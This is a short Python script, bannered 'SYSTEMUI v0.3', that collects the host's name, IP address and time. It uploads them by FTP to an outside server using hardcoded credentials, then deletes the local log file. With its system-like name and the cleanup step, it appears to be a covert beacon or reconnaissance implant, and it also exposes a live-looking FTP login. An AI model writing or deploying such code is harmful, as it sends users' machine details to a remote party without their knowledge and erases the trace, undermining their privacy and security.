import os   # delete function
import socket   # get hostname and ip
import ftplib
import emoji
from datetime import datetime

# Constant & Variabals
now = datetime.now()
date_string = now.strftime("%d/%m/%Y %H:%M:%S")
hostname = socket.gethostname()
IPAddr = socket.gethostbyname(hostname) 
ftp = ftplib.FTP('inventor-hosting.store')
ftp.login('15', '8jd58tzl')

# Function
def writeFile():
    f = open("py_logs.txt", "a")
    f.write("###### SYSUI v0.3 ######\nHostname:\t" + hostname + "\nIP:\t" + IPAddr + "\nTime:\t" + now.strftime("%Y-%m-%d %H:%M:%S") + "\n")
    f.close()
    print("File was generated successfully")

def printFlie():
    f = open("py_logs.txt", "r")
    print(f.read())

def uploadFile():
    filename = "py_logs.txt"
    ftp.cwd('py_ftp')
    uploadfile = open('py_logs.txt', 'rb')
    ftp.storlines('STOR ' + filename, uploadfile)
    print("File was uploaded successfully")

def deleteFile():
    if os.path.exists("py_logs.txt"):
        os.remove("py_logs.txt")
        print("File was deleted successfully")
    else:
        print("The file does not exist")

# Main
print(emoji.emojize('SYSTEMUI v0.3 :star:', use_aliases=True))
writeFile()
#printFlie()
uploadFile()
deleteFile()